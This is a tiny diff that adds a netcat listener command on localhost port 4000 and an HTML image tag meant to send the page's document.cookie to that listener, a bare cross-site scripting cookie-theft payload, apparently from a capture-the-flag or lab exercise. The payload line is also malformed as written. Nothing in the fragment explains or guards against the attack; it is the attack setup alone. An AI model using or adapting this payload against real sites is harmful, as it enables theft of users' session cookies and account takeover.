@@ -1,0 +1,3 @@
+netcat -vvl -s localhost -p 4000
+
+<img src="http://localhost:4000?flg"+document.cookie>
